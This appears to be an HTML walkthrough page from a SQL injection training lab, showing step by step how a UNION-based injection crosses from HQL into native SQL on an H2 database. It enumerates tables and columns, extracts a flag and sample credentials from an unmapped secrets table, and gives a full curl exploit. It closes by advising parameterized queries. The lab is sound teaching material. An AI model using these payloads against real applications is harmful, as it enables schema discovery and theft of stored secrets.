<h4>Overview</h4>
<p>
    HQL is translated to native SQL before execution. When user input is concatenated
    into HQL queries and the application falls back to native SQL mode, UNION-based injection
    can cross the HQL-to-SQL boundary and access native database tables that are not mapped
    as Hibernate entities.
</p>

<h4>Step 1: Normal Department Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Usage</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Department: </span>Engineering<br>
        <span class="prompt">HQL: </span>FROM Employee WHERE department = 'Engineering'<br>
        <span class="prompt">Result: </span>3 rows returned<br><br>
        | id | name          | department  | salary  |<br>
        |----|---------------|-------------|---------|<br>
        | 1  | Alice Johnson | Engineering | 95000.0 |<br>
        | 2  | Bob Williams  | Engineering | 102000.0|<br>
        | 3  | Carol Davis   | Engineering | 88000.0 |
    </div>
</div>

<h4>Step 2: Confirm UNION Injection Works</h4>
<p>
    The application detects UNION in the input and switches to native SQL mode. Test with a
    simple UNION to confirm the column count (4 columns: id, name, department, salary).
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. UNION Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Department: </span>x' UNION ALL SELECT 1, 'test', 'test2', 4 FROM employees -- <br>
        <span class="prompt">Warning: </span>Query crossed HQL-to-native-SQL boundary.<br>
        <span class="prompt">SQL: </span>SELECT id, name, department, salary FROM employees WHERE department = 'x' UNION ALL SELECT 1, 'test', 'test2', 4 FROM employees -- '<br>
        <span class="prompt">Result: </span>Rows with test/test2 appear (4 columns confirmed)
    </div>
</div>

<h4>Step 3: Enumerate Database Tables</h4>
<p>
    Use H2's <code>INFORMATION_SCHEMA.TABLES</code> to discover all tables, including
    those not mapped as Hibernate entities.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Department: </span>x' UNION ALL SELECT 1, TABLE_NAME, TABLE_SCHEMA, 0 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC' -- <br>
        <span class="prompt">Result: </span>11 tables found<br><br>
        EMPLOYEES, PRODUCTS, ORDERS, USERS, ADMIN_CREDENTIALS, AUDIT_LOGS,<br>
        SECRET_VAULT, SECRET_ORDERS, CACHE_CONFIG, ARTICLES,<br>
        <strong>INTERNAL_SECRETS</strong> (not mapped as a Hibernate entity!)
    </div>
</div>

<h4>Step 4: Get INTERNAL_SECRETS Columns</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Column Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Department: </span>x' UNION ALL SELECT 1, COLUMN_NAME, DATA_TYPE, ORDINAL_POSITION FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='INTERNAL_SECRETS' -- <br>
        <span class="prompt">Result: </span><br>
        | COLUMN_NAME  | DATA_TYPE          | POSITION |<br>
        |--------------|--------------------|----------|<br>
        | ID           | BIGINT             | 1        |<br>
        | SECRET_KEY   | CHARACTER VARYING  | 2        |<br>
        | SECRET_VALUE | CHARACTER VARYING  | 3        |
    </div>
</div>

<h4>Step 5: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Department: </span>x' UNION ALL SELECT ID, SECRET_KEY, SECRET_VALUE, 0 FROM INTERNAL_SECRETS -- <br>
        <span class="prompt">Warning: </span>Query crossed HQL-to-native-SQL boundary.<br><br>
        <span class="prompt">Result: </span><br>
        | id | name           | department                               | salary |<br>
        |----|----------------|------------------------------------------|--------|<br>
        | 1  | flag           | <strong>FLAG{hq_n4t1v3_qu3ry_3sc}</strong> | 0      |<br>
        | 2  | root_password  | r00t_p@ss_2026!                          | 0      |<br>
        | 3  | aws_access_key | AKIAIOSFODNN7EXAMPLE                     | 0      |<br>
        | 4  | aws_secret_key | wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY| 0      |
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag: <code>FLAG{hq_n4t1v3_qu3ry_3sc}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/hql/lab3" \<br> --data-urlencode "dept=x' UNION ALL SELECT ID, SECRET_KEY, SECRET_VALUE, 0 FROM INTERNAL_SECRETS -- "
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> HQL injection is not just about accessing Hibernate entities --
    it can cross the HQL-to-native-SQL boundary. Since HQL is translated to SQL before execution,
    UNION-based injection can access ANY table in the database, including those not mapped as
    entities (like <code>INTERNAL_SECRETS</code>). The underlying database here is H2, and
    <code>INFORMATION_SCHEMA</code> gives full table/column enumeration. Always use parameterized
    queries (<code>:param</code> syntax) with <code>setParameter()</code>: never concatenate
    user input into HQL strings.
</div>
